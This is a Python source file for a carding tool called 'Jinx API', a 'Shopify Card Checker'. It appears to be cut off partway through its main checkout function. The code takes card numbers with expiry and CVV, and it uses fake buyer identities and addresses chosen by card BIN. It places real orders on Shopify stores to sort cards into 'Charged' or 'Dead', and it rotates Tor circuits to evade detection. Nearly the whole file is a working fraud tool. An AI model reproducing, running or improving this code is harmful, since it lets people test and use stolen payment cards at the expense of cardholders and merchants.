#!/usr/bin/env python3
"""
Jinx API — 5-in-1 Shopify Card Checker (v6.0)
===============================================
Combines:
  1. zkbot.py       → Tor proxy pool + auto-rotate (SOCKS5)
  2. nomi-api       → aiohttp + ThreadPoolExecutor
  3. fastapi-style  → async clean structure
  4. shopifyk       → Proposal → Delivery → Submit → Poll
  5. full debug     → detailed logging

Endpoints:
  GET /Shopify?cc=<card>&site=<site>&proxy=<optional>&debug=1
  GET /tor/start?count=5      → Start Tor pool
  GET /tor/stop               → Stop Tor pool
  GET /tor/rotate             → Rotate all circuits
  GET /tor/ips                → Get all exit IPs
  GET /health                 → Health check
"""

import os
import re
import json
import time
import random
import logging
import asyncio
import threading
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import requests
from aiohttp import web
from aiohttp_socks import ProxyConnector

# ═══ CONFIG ═══
HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("API_PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))
TOR_POOL_SIZE = int(os.environ.get("TOR_POOL_SIZE", "5"))
AUTO_ROTATE_INTERVAL = int(os.environ.get("AUTO_ROTATE_INTERVAL", "360"))

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

VAULT_ENDPOINTS = [
    "https://checkout.pci.shopifyinc.com/sessions",
    "https://deposit.us.shopifycs.com/sessions",
]

PRICE_MIN = 2.00
PRICE_MAX = 25.00

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("jinx")


# ═══ GLOBAL TOR STATE ═══
_tor_processes = []
_tor_connectors = []
_tor_rr = 0
_tor_lock = asyncio.Lock()
_auto_rotate_task = None
_tor_enabled = False


# ═══ BIN → ADDRESS ═══
BOOK = {
    "US": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
           "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
           "state": "Maine", "currency": "USD"},
    "MX": {"address1": "Av. Reforma 222", "city": "Ciudad de Mexico", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "+525555555555",
           "state": "Ciudad de Mexico", "currency": "MXN"},
    "DEFAULT": {"address1": "123 Main St", "city": "Portland", "postalCode": "04101",
                "zoneCode": "ME", "countryCode": "US", "phone": "+12075551234",
                "state": "Maine", "currency": "USD"},
}

_bin_cache = {}
_bin_lock = threading.Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            c = (d.get("country_code") or d.get("country_alpha2") or "US").upper()
            with _bin_lock:
                _bin_cache[bin6] = c
            return c
    except Exception:
        pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def addr_for(cc_number):
    cc = lookup_bin_country(cc_number[:6])
    return BOOK.get(cc, BOOK["DEFAULT"])


# ═══ PROXY PARSER ═══
def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══ TOR POOL MANAGEMENT ═══
async def _drain_stdout(proc):
    if proc and proc.stdout:
        try:
            async for _ in proc.stdout:
                pass
        except Exception:
            pass


async def _start_one_tor(i):
    socks_port = 9050 + i * 2
    ctrl_port = 9051 + i * 2
    data_dir = f"/tmp/tor_api_{i}"
    os.makedirs(data_dir, exist_ok=True)

    torrc = (
        f"SocksPort {socks_port}\n"
        f"ControlPort {ctrl_port}\n"
        f"DataDirectory {data_dir}\n"
        "CookieAuthentication 0\n"
        "Log notice stdout\n"
        "MaxCircuitDirtiness 10\n"
    )
    torrc_path = f"/tmp/torrc_api_{i}"
    with open(torrc_path, "w") as f:
        f.write(torrc)

    try:
        proc = await asyncio.create_subprocess_exec(
            'tor', '-f', torrc_path,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )
    except FileNotFoundError:
        log.error(f"[tor-{i}] tor not installed")
        return None

    log.info(f"[tor-{i}] Starting socks={socks_port} ctrl={ctrl_port}...")

    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=10)
        except asyncio.TimeoutError:
            continue
        if not line:
            log.error(f"[tor-{i}] process ended")
            return None
        line_str = line.decode(errors='replace').strip()
        if "Bootstrapped 100%" in line_str:
            log.info(f"[tor-{i}] Bootstrapped OK port={socks_port}")
            asyncio.create_task(_drain_stdout(proc))
            return proc

    log.error(f"[tor-{i}] Bootstrap timeout")
    return None


async def _kill_all_tor():
    global _tor_processes
    for p in _tor_processes:
        try:
            if p.returncode is None:
                p.kill()
        except Exception:
            pass
    await asyncio.gather(*[
        p.wait() for p in _tor_processes if p.returncode is None
    ], return_exceptions=True)
    _tor_processes.clear()

    # Cleanup lock files
    for i in range(20):
        try:
            os.remove(f"/tmp/tor_api_{i}/lock")
        except FileNotFoundError:
            pass
    await asyncio.sleep(1)


async def start_tor_pool(count=5):
    global _tor_processes, _tor_connectors, _tor_enabled

    async with _tor_lock:
        await _kill_all_tor()

        results = await asyncio.gather(*[_start_one_tor(i) for i in range(count)])
        _tor_processes = [p for p in results if p is not None]

        log.info(f"[tor] Pool started: {len(_tor_processes)}/{count}")

        # Build connectors
        _tor_connectors.clear()
        for i in range(len(_tor_processes)):
            socks_port = 9050 + i * 2
            try:
                conn = ProxyConnector.from_url(
                    f'socks5://127.0.0.1:{socks_port}',
                    rdns=True, limit=100, ssl=False
                )
                _tor_connectors.append(conn)
            except Exception as e:
                log.error(f"[tor] connector {socks_port}: {e}")

        _tor_enabled = len(_tor_connectors) > 0
        return _tor_enabled


async def rotate_tor():
    async def _rotate_one(ctrl_port):
        try:
            _, writer = await asyncio.open_connection('127.0.0.1', ctrl_port)
            writer.write(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n')
            await writer.drain()
            await asyncio.sleep(0.5)
            writer.close()
            await writer.wait_closed()
            return True
        except Exception as e:
            log.error(f"[tor] rotate ctrl={ctrl_port}: {e}")
            return False

    ctrl_ports = [9051 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[_rotate_one(p) for p in ctrl_ports])
    return any(results)


async def get_ip_via_port(socks_port):
    try:
        conn = ProxyConnector.from_url(
            f'socks5://127.0.0.1:{socks_port}', rdns=True, ssl=False
        )
        async with aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as s:
            async with s.get('https://api.ipify.org?format=json') as r:
                data = await r.json()
                return data.get('ip', 'unknown')
    except Exception:
        return 'error'


async def get_all_proxy_ips():
    ports = [9050 + i * 2 for i in range(len(_tor_processes))]
    results = await asyncio.gather(*[get_ip_via_port(p) for p in ports])
    return list(zip(ports, results))


def get_next_tor_connector():
    global _tor_rr
    if not _tor_connectors:
        return None
    c = _tor_connectors[_tor_rr % len(_tor_connectors)]
    _tor_rr = (_tor_rr + 1) % len(_tor_connectors)
    return c


async def auto_rotate_loop():
    while _tor_enabled:
        await asyncio.sleep(AUTO_ROTATE_INTERVAL)
        if not _tor_enabled:
            break
        await rotate_tor()
        log.info(f"[auto-rotate] Rotated {len(_tor_processes)} circuits")


def start_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = asyncio.create_task(auto_rotate_loop())


def stop_auto_rotate():
    global _auto_rotate_task
    if _auto_rotate_task and not _auto_rotate_task.done():
        _auto_rotate_task.cancel()
    _auto_rotate_task = None


# ═══ QUERIES ═══
PROPOSAL_QUERY = (
    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
    "session(sessionInput:$sessionInput){"
    "negotiate(input:{"
    "purchaseProposal:{"
    "delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,"
    "buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "optionalDuties:$optionalDuties,captcha:$captcha},"
    "checkpointData:$checkpointData,"
    "queueToken:$queueToken}){"
    "__typename result{"
    "... on NegotiationResultAvailable{checkpointData queueToken sellerProposal{"
    "__typename delivery{... on FilledDeliveryTerms{deliveryLines{id "
    "availableDeliveryStrategies{... on CompleteDeliveryStrategy{handle title __typename}__typename}"
    "__typename}__typename}__typename}"
    "payment{... on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "... on PaymentProvider{paymentMethodIdentifier name __typename}"
    "__typename}__typename}__typename}__typename}__typename}"
    "__typename}... on CheckpointDenied{redirectUrl __typename}"
    "... on Throttled{pollAfter queueToken pollUrl __typename}"
    "... on NegotiationResultFailed{__typename}__typename}"
    "errors{code localizedMessage __typename}__typename}}}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){"
    "submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "... on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "... on SubmitFailed{reason __typename}"
    "... on SubmitRejected{errors{... on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "... on Throttled{pollAfter pollUrl queueToken __typename}"
    "... on CheckpointDenied{redirectUrl __typename}"
    "... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}"
    "__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)

POLL_QUERY = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "... on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "... on ProcessingReceipt{id pollDelay __typename}"
    "... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
    "... on FailedReceipt{id processingError{... on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
    "__typename}"
)


# ═══ CODE MAP ═══
CODE_MAP = {
    "PAYMENTS_UNACCEPTABLE": "PAYMENTS_UNACCEPTABLE",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": "PAYMENT_AMOUNT_INVALID",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_METHOD": "PAYMENT_METHOD_REJECTED",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_CVV_FAILED": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INCORRECT_NUMBER": "INCORRECT_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER": "INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVV": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY": "INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_DECLINED": "CARD_DECLINED",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE": "GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER": "CALL_ISSUER",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR": "DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD": "PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_RESTRICTED_CARD": "RESTRICTED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_SECURITY_VIOLATION": "SECURITY_VIOLATION",
    "PAYMENTS_CREDIT_CARD_BASE_SERVICE_NOT_ALLOWED": "SERVICE_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD": "STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_TRANSACTION_NOT_ALLOWED": "TRANSACTION_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_TRY_AGAIN_LATER": "TRY_AGAIN_LATER",
    "PAYMENTS_CREDIT_CARD_BASE_PROCESSING_ERROR": "PROCESSING_ERROR",
    "PAYMENT_FAILED": "CARD_DECLINED",
    "GENERIC_ERROR": "GENERIC_DECLINE",
}


def map_code(raw):
    return CODE_MAP.get(raw, raw) if raw else "CARD_DECLINED"


# ═══ MAIN CHECKOUT (runs in thread) ═══
def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False, use_tor=False):
    out = {
        "Response": "SITE_ERROR",
        "Price": "-",
        "Gateway": "Shopify",
        "Status": "Site Error",
        "Card": cc_raw,
        "Site": site_raw,
        "Debug": "",
    }

    def dbg(msg):
        if debug:
            out["Debug"] += f" | {msg}"
        log.warning(f"[{cc_raw[:6]}] {msg}")

    parts = cc_raw.split("|")
    if len(parts) != 4:
        out["Response"] = "INVALID_FORMAT"
        return out

    cc, mm, yyyy, cvv = parts
    if len(yyyy) == 2:
        yyyy = "20" + yyyy

    site = re.sub(r"^https?://", "", site_raw.strip()).rstrip("/")
    proxy_url = parse_proxy(proxy_raw) if proxy_raw else None

    a = addr_for(cc)
    currency = a.get("currency", "USD")
    country = a.get("countryCode", "US")
    first_name = random.choice(["James", "John", "Robert", "Michael", "David"])
    last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@gmail.com"

    dbg(f"START proxy={bool(proxy_url)} tor={use_tor} country={country}")

    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})

    # Tor → use HTTP proxy adapter (Tor exposes SOCKS5)
    if use_tor and _tor_connectors:
        # We use requests with SOCKS proxy via PySocks
        try:
            port = 9050 + (_tor_rr % max(1, len(_tor_connectors))) * 2
            tor_proxy = f"socks5://127.0.0.1:{port}"
            s.proxies.update({"http": tor_proxy, "https": tor_proxy})
            dbg(f"Using TOR port {port}")
        except Exception as e:
            dbg(f"Tor setup failed: {e}")
    elif proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})

    no_proxy_sess = requests.Session()
    no_proxy_sess.headers.update({"User-Agent": UA})

    try:
        # ── 1. Products ──
        try:
            r = s.get(f"https://{site}/products.json", timeout=15)
            dbg(f"products.json → {r.status_code}")
        except Exception as e:
            dbg(f"products.json EXC: {type(e).__name__}")
            out["Response"] = "PROXY_FAIL"
            out["Status"] = "Proxy Error"
            return out

        if r.status_code == 429:
            out["Response"] = "RATE_LIMITED"
            out["Status"] = "Site Error"
            return out

        if r.status_code != 200:
            out["Response"] = f"PRODUCTS_HTTP_{r.status_code}"
            return out

        try:
            data = r.json()
        except Exception:
            out["Response"] = "PRODUCTS_JSON_INVALID"
            return out

        valid = []
        blacklist = ["sample", "free", "gift", "test", "donation", "tip"]
        for p in data.get("products", []):
            title = (p.get("title") or "").lower()
            if any(w in title for w in blacklist):
                continue
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", "999")).replace(",", ""))
                except Exception:
                    continue
                if PRICE_MIN <= price <= PRICE_MAX:
                    valid.append({"id": v["id"], "price": price})

        if not valid:
            out["Response"] = "NO_VALID_PRODUCT"
            return out

        valid.sort(key=lambda x: x["price"])
        mid = min(len(valid) // 2, len(valid) - 1)
        vid = valid[mid]["id"]
        out["Price"] = f"{valid[mid]['price']:.2f}"
        dbg(f"Picked ${out['Price']}")

        # ── 2. Add to cart ──
        try:
            r = s.post(f"https://{site}/cart/add.js",
                headers={"Accept": "application/json",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Referer": f"https://{site}/",
                         "Origin": f"https://{site}"},
                data={"id": str(vid), "quantity": "1", "form_type": "product"},
                timeout=15)
            dbg(f"cart/add.js → {r.status_code}")
            if r.status_code != 200:
                out["Response"] = f"CART_HTTP_{r.status_code}"
                return out
        except Exception as e:
            dbg(f"cart/add.js EXC: {type(e).__name__}")
            out["Response"] = "CART_FAIL"
            return out

        # ── 3. Cart token ──
        cart_token = None
        for attempt in range(3):
            try:
                r = s.get(f"https://{site}/cart.js", timeout=15)
                j = r.json()
                cart_token = j.get("token")
                if cart_token:
                    break
                time.sleep(0.5)
            except Exception:
                time.sleep(0.5)

        if not cart_token:
            out["Response"] = "CART_TOKEN_FAIL"
            return out

        # ── 4. Init checkout ──
        try:
            r = s.post(f"https://{site}/cart",
                headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Origin": f"https://{site}",
                         "Referer": f"https://{site}/cart",
                         "Upgrade-Insecure-Requests": "1"},
                data={"checkout": "", "updates[]": "1"},
                allow_redirects=False, timeout=15)

            dbg(f"checkout POST → {r.status_code}")

            if r.status_code not in (301, 302, 303, 307, 308):
                out["Response"] = f"CHECKOUT_HTTP_{r.status_code}"
                return out

            loc1 = r.headers.get("location", "")
            r2 = s.get(loc1, allow_redirects=False, timeout=15)
            final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
            r3 = s.get(final_url, timeout=25)
            html = r3.text
            dbg(f"Checkout {len(html)} bytes")
        except Exception as e:
            dbg(f"checkout EXC: {type(e).__name__}")
            out["Response"] = "CHECKOUT_FAIL"
            return out

        if len(html) < 500:
            out["Response"] = "CHECKOUT_EMPTY"
            return out

        if "captcha" in html.lower() or "hcaptcha" in html.lower():
            dbg("Captcha detected")
            out["Response"] = "CAPTCHA_REQUIRED"
            out["Status"] = "Site Error"
            return out

        # ── 5. Session token ──
        session_token = None
        for pat in [r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                    r'"sessionToken"\s*:\s*"([^"]+)"',
                    r'serialized-sessionToken[^>]*content="&quot;([^&]+)&quot;"']:
            m = re.search(pat, html)
            if m:
                session_token = m.group(1)
                break

        if not session_token:
            out["Response"] = "NO_SESSION_TOKEN"
            return out

        queue_token = ""
        for pat in [r'"queueToken"\s*:\s*"([^"]+)"', r'queueToken&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                queue_token = m.group(1)
                break

        stable_id = ""
        for pat in [r'"stableId"\s*:\s*"([^"]+)"', r'stableId&quot;:&quot;([^&]+)&quot;']:
            m = re.search(pat, html)
            if m:
                stable_id = m.group(1)
                break

        attempt_token = ""
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", final_url)
        if m:
            attempt_token = m.group(1)

        # ── 6. Proposal ──
        gql_url = f"https://{site}/checkouts/unstable/graphql"
        gql_headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": f"https://{site}",
            "Referer": f"https://{site}/",
            "X-Checkout-One-Session-Token": session_token,
            "X-Checkout-Web-Deploy-Stage": "production",
            "X-Checkout-Web-Server-Handling": "fast",
            "X-Checkout-Web-Source-Id": attempt_token,
        }

        addr_obj = {
            "address1": a["address1"], "city": a["city"],
            "countryCode": country, "postalCode": a["postalCode"],
            "firstName": first_name, "lastName": last_name,
            "zoneCode": a["zoneCode"], "phone": a["phone"],
        }

        state = {"queue": queue_token, "checkpoint": None, "delivery": ""}

        def proposal_payload(handle=None):
            dv = {
                "deliveryLines": [{
                    "destination": {"streetAddress": addr_obj},
                    "targetMerchandiseLines": (
                        {"lines": [{"stableId": stable_id or "1"}]} if handle else {"any": True}),
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": (handle is None),
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
            }
            if handle:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {"handle": handle, "customDeliveryRate": False},
                    "options": {}}
            else:
                dv["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True}},
                    "options": {}}

            return {
                "query": PROPOSAL_QUERY,
                "variables": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "checkpointData": state["checkpoint"],
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": dv,
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [],
                                "billingAddress": {"streetAddress": addr_obj}},
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

        # First proposal
        for attempt in range(6):
            try:
                r = s.post(gql_url, headers=gql_headers, json=proposal_payload(), timeout=20)
                j = r.json()
            except Exception:
                time.sleep(1)
                continue

            if j.get("errors"):
                break

            negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
            result_r = negotiate.get("result", {}) or {}
            tn = result_r.get("__typename", "")

            if tn != "NegotiationResultAvailable":
                time.sleep(1)
                continue

            state["queue"] = result_r.get("queueToken") or state["queue"]
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            seller = result_r.get("sellerProposal", {}) or {}
            delivery = seller.get("delivery", {}) or {}

            if delivery.get("__typename") == "FilledDeliveryTerms":
                dl = delivery.get("deliveryLines", []) or []
                if dl:
                    strats = dl[0].get("availableDeliveryStrategies", []) or []
                    if strats:
                        state["delivery"] = strats[0].get("handle", "")
                        break
            time.sleep(1)

        if not state["delivery"]:
            out["Response"] = "NO_DELIVERY_STRATEGY"
            return out

        # Second proposal
        try:
            r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
            j = r.json()
        except Exception:
            out["Response"] = "PROPOSAL_2_FAIL"
            return out

        negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
        result_r = negotiate.get("result", {}) or {}
        payment_method_id = ""
        if result_r.get("__typename") == "NegotiationResultAvailable":
            state["checkpoint"] = result_r.get("checkpointData") or state["checkpoint"]
            state["queue"] = result_r.get("queueToken") or state["queue"]
            seller = result_r.get("sellerProposal", {}) or {}
            pl = (seller.get("payment", {}) or {}).get("availablePaymentLines", []) or []
            if pl:
                payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")

        if not payment_method_id:
            out["Response"] = "NO_PAYMENT_METHOD"
            return out

        # ── 7. Vault (no proxy) ──
        vault_payload = {
            "credit_card": {"number": cc, "month": int(mm), "year": int(yyyy),
                            "verification_value": cvv,
                            "name": f"{first_name} {last_name}"},
            "payment_session_scope": site,
        }
        payment_session_id = None
        for url in VAULT_ENDPOINTS:
            try:
                r = no_proxy_sess.post(url, json=vault_payload,
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json",
                             "Origin": "https://checkout.shopifycs.com",
                             "Referer": "https://checkout.shopifycs.com/",
                             "User-Agent": UA}, timeout=15)
                if r.status_code == 200:
                    pid = r.json().get("id")
                    if pid:
                        payment_session_id = pid
                        break
            except Exception:
                pass

        if not payment_session_id:
            out["Response"] = "VAULT_FAILED"
            return out

        # ── 8. Submit ──
        submit_payload = {
            "query": SUBMIT_QUERY,
            "variables": {
                "input": {
                    "checkpointData": state["checkpoint"],
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": state["queue"] or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {"deliveryLines": [{
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": state["delivery"], "customDeliveryRate": False},
                            "options": {}},
                        "targetMerchandiseLines": {"lines": [{"stableId": stable_id or "1"}]},
                        "destination": {"streetAddress": addr_obj},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": False}],
                        "noDeliveryRequired": [], "useProgressiveRates": False},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id or "1",
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{vid}",
                            "variantId": f"gid://shopify/ProductVariant/{vid}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": []}]},
                    "payment": {"totalAmount": {"any": True},
                        "paymentLines": [{"paymentMethod": {"directPaymentMethod": {
                            "paymentMethodIdentifier": payment_method_id,
                            "sessionId": payment_session_id,
                            "billingAddress": {"streetAddress": addr_obj},
                            "cardSource": None}},
                            "amount": {"any": True}, "dueAt": None}],
                        "billingAddress": {"streetAddress": addr_obj}},
                    "buyerIdentity": {
                        "buyerIdentity": {"presentmentCurrency": currency, "countryCode": country},
                        "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}},
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country}},
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {"signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": []},
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": f"{attempt_token}-{random.random()}",
                "metafields": [],
                "analytics": {"requestUrl": final_url},
            },
            "operationName": "SubmitForCompletion",
        }

        try:
            r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
            j = r.json()
        except Exception:
            out["Response"] = "SUBMIT_FAIL"
            return out

        c = j.get("data", {}).get("submitForCompletion", {})
        tn = c.get("__typename", "")

        if tn not in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            errs = c.get("errors", [])
            if errs:
                code = errs[0].get("code", "")
                msg = errs[0].get("localizedMessage", "") or errs[0].get("nonLocalizedMessage", "")
                out["Response"] = map_code(code) if code else "CARD_DECLINED"
                out["Status"] = "Dead"
            else:
                out["Response"] = "SUBMIT_REJECTED"
                out["Status"] = "Dead"
            return out

        rid = (c.get("receipt", {}) or {}).get("id", "")
        if not rid:
            out["Response"] = "NO_RECEIPT"
            return out

        # ── 9. Poll ──
        for _ in range(8):
            time.sleep(2)
            try:
                r = s.post(gql_url, headers=gql_headers,
                    json={"query": POLL_QUERY,
                          "variables": {"receiptId": rid, "sessionToken": session_token},
                          "operationName": "PollForReceipt"}, timeout=25)
                j = r.json()
            except Exception:
                continue

            receipt = j.get("data", {}).get("receipt", {}) or {}
            rtn = receipt.get("__typename", "")

            if rtn == "ProcessedReceipt" or "orderIdentity" in receipt:
                out["Response"] = "ORDER_PLACED"
                out["Status"] = "Charged"
                out["Gateway"] = "Shopify Payments"
